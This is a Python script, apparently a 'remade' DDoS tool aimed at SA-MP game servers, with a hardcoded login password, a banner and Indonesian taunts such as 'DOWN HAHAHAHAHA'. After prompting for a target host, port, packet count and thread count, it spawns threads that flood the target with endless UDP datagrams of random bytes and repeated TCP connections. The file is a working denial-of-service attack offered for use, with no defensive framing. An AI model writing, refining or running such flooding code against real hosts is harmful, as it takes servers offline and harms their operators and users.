#!/usr/bin/env python3
password ='MRDANI'
#Remake by : MR.DANI
import random
import socket
import threading
import os,sys
import time

os.system("clear")
for i in range(3):
    pwd = input("[•] Enter Account : ")
    j=3
    if(pwd==password):
        time.sleep(5)
        print("[+] Wait A Moment!!! ")
        break
    else:
        time.sleep(5)
        print("[×] Wrong Account!!! ")
        continue
time.sleep(5)
print("[@] Login Successful")
time.sleep(5)

os.system("clear")
print("\033[31m =========================================================================")
print("\033[31m                                    » TOOLS BY REMAKE BY MR.DANI X Ndag OgX «")
print("\033[31m =========================================================================")
print("""\033[91m
███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗
████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║
██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║
██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║
██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝
""")
print("\033[31m »DDOS ATTACK FOR SAMP")
print("\033[31m »Script Ini Dibuat Hanya Untuk Mr.Dani dan NdagOgX")
print("\033[0m")

ip = str(input("\033[0m }====> \033[91m Target Host/Ip:"))
port = int(input("  \033[0m }====> \033[91m Target Port:"))
choice = str(input("  \033[0m }====> \033[91m Gas Ddos? (y/n):"))
times = int(input("  \033[0m }====> \033[91m Packets:"))
threads = int(input("\033[0m }====> \033[91m Threads:"))

os.system("clear")
def run():
	data = random._urandom(1800)
	i = random.choice(("\033[93m[@] (MR.DANI) ===> ","\033[93m[@] (MR.DANI) ===> ","\033[93m[@] (MR.DANI) ===> "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m TOK TOK TOK PAKET IP \033[0m%s \033[91mPAKET DARI MR.DANI PORT \033[0m%s"%(ip, port))
		except:
			print("[MAMPUS] DOWN HAHAHAHAHA!!!")

def run2():
	data = random._urandom(18)
	i = random.choice(("\033[93m[@] (MR.DANI) ===> ","\033[93m[@] (MR.DANI) ===> ","\033[93m[@] (MR.DANI) ===> "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m TOK TOK TOK PAKET IP \033[0m%s \033[91mPAKET DARI MR.DANI PORT \033[0m%s"%(ip, port))
		except:
			s.close()
			print("[MAMPUS] DOWN HAHAHAHAHA!!!")

def run3():
	data = random._urandom(8)
	i = random.choice(("\033[93m[@] (MR.DANI) ===> ","\033[93m[@] (MR.DANI) ===> ","\033[93m[@] (MR.DANI) ===> "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m TOK TOK TOK PAKET IP \033[0m%s \033[91mPAKET DARI MR.DANI PORT \033[0m%s"%(ip, port))
		except:
			s.close()
			print("[MAMPUS] DOWN HAHAHAHAHA!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
